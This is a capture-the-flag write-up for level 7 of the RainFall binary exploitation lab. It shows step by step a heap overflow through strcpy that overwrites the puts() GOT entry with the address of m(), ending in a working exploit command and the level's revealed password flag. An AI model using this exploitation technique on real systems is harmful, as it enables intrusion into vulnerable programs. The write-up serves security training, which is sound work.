# Level 7

This time we still have `malloc()` calls but most importantly,
after this there is two `strcpy()`, a call to `fgets()` to get the data of `.pass` and a call to `puts()`

Lets try to overflow the `malloc()`'ed strings:

```bash
level7@RainFall:~$ ./level7 AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIII 0000111122223333444455556666
Segmentation fault (core dumped)
level7@RainFall:~$ dmesg
[...]
[110698.290281] level7[29932]: segfault at 46464646 ip b7eb8b59 sp bffff5f4 error 6 in libc-2.15.so[b7e2c000+1a3000]
```

With this we can see that we fault at the `0x46464646` address, which is where we've put our `F`s.

Let's understand what is happening.
Basically, there is two `strcpy()` calls like this:

```c
strcpy(tab1[1], argv[1]);
strcpy(tab2[1], argv[2]);
```

Our goal is to overflow `tab1[1]` enough so the address located at `tab2[1]` is something else than a string.
This is what happens when we write too much on `argv[1]`, as we saw it tries to write something at the address `0x46464646`.
To be sure of this let's try with another address.
We can write unwritable characters with `echo -ne`.
- `-n` is to not have a trailing `\n`
- `-e` is to compute excape sequences, in our case the `\xff`

```bash
level7@RainFall:~$ ./level7 `echo -ne "AAAABBBBCCCCDDDDEEEE\xff\xff\xff\xff"` whatever
Segmentation fault (core dumped)
level7@RainFall:~$ dmesg
[...]
[111283.212093] level7[29953]: segfault at ffffffff ip b7eb8f92 sp bffff61c error 7 in libc-2.15.so[b7e2c000+1a3000]
```

So it works as intended. We can write data at arbitrary positions. Now where and what to write?

The call to `fgets()` is the following:

```c
fgets(c, 0x44, "/home/user/level8/.pass");
puts("~~");
```

The variable `c` is a global variable.
We can also find another function, `m()`, that does the following:

```c
void	m() {
	printf("%c - %d\n", c, time(0));
}
```

Perfect! There is a function that prints our `c` variable!

Now it should look familiar to you, as it the same thing as the level 5.
We will overwrite the GOT where `puts()` is stored to write the address of `m()`

```gdb
(gdb) disas 0x8048400
Dump of assembler code for function puts@plt:
   0x08048400 <+0>:     jmp    DWORD PTR ds:0x8049928
   0x08048406 <+6>:     push   0x28
   0x0804840b <+11>:    jmp    0x80483a0
End of assembler dump.
(gdb) disas m
Dump of assembler code for function m:
   0x080484f4 <+0>:     push   ebp
   0x080484f5 <+1>:     mov    ebp,esp
[...]
End of assembler dump.
```

So we need to write `0x080484f4` at the address `0x8049928`:

```bash
level7@RainFall:~$ ./level7 \
> `echo -ne "AAAABBBBCCCCDDDDEEEE\x28\x99\x04\x08"` \
> `echo -ne "\xf4\x84\x04\x08"`
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1715685503
```

Works like a charm!

## .pass: 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9